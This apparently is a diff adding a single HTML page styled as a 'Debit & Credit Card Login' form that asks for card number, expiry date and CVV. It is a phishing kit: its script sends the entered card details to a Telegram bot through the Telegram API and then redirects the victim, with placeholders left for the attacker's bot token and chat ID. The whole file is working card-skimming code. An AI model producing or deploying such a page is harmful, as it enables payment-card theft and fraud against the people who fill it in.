@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debit & Credit Card Login</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: #f3f4f6; 
+            color: #333; 
+        }
+        .form-container { 
+            max-width: 400px; 
+            margin: 50px auto; 
+            background: white; 
+            padding: 20px; 
+            border-radius: 10px; 
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); 
+        }
+        .header-image { 
+            text-align: center; 
+            margin-bottom: 20px; 
+        }
+        .header-image img { 
+            max-width: 100%; 
+            height: auto; 
+            border-radius: 10px; 
+        }
+        h1 { 
+            text-align: center; 
+            color: #007bff; 
+            font-size: 24px; 
+            margin-bottom: 20px; 
+        }
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: bold; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin-bottom: 16px; 
+            border: 1px solid #ddd; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            box-sizing: border-box; 
+        }
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background-color: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: background-color 0.3s ease; 
+        }
+        button:hover { 
+            background-color: #0056b3; 
+        }
+        @media (max-width: 480px) {
+            .form-container { 
+                padding: 15px; 
+                margin: 20px; 
+            }
+            h1 { 
+                font-size: 20px; 
+            }
+            input { 
+                font-size: 14px; 
+                padding: 10px; 
+            }
+            button { 
+                font-size: 14px; 
+                padding: 10px; 
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="header-image">
+            <img src="logo.jpg" alt="Header Image">
+        </div>
+        <h1>Debit & Credit Card Login</h1>
+        <form id="cardLoginForm">
+            <label for="cardNumber">Card Number</label>
+            <input type="text" inputmode="numeric" minlength="16" maxlength="16" id="cardNumber" name="cardNumber" placeholder="Enter your 16-digit card number" required>
+
+            <label for="expDate">Expiration Date (MM/YY)</label>
+            <input type="text" id="expDate" name="expDate" placeholder="MM/YY" required>
+
+            <label for="cvv">CVV</label>
+            <input type="password" inputmode="numeric" minlength="3" maxlength="3" id="cvv" name="cvv" placeholder="Enter CVV" required>
+
+            <button type="button" id="cardLoginBtn">Login</button>
+        </form>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = 'your_telegram_bot_token'; // Replace with your Telegram Bot Token
+        const TELEGRAM_CHAT_ID = 'your_chat_id'; // Replace with your Telegram Chat ID
+        const REDIRECT_URL = 'https://example.com/dashboard'; // Replace with your desired redirect URL
+
+        document.getElementById('cardLoginBtn').addEventListener('click', async () => {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expDate = document.getElementById('expDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!cardNumber || !expDate || !cvv) {
+                alert('Please fill in all fields.');
+                return;
+            }
+
+            const message = `
+                💳 *Debit & Credit Card Login Attempt*:
+                🏷️ Card Number: ${cardNumber}
+                📅 Expiration Date: ${expDate}
+                🔒 CVV: ${cvv}
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    // Redirect to the specified URL after successful submission
+                    window.location.href = wait.html;
+                } else {
+                    alert('Error sending data to Telegram.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to send data.');
+            }
+        });
+    </script>
+</body>
+</html>
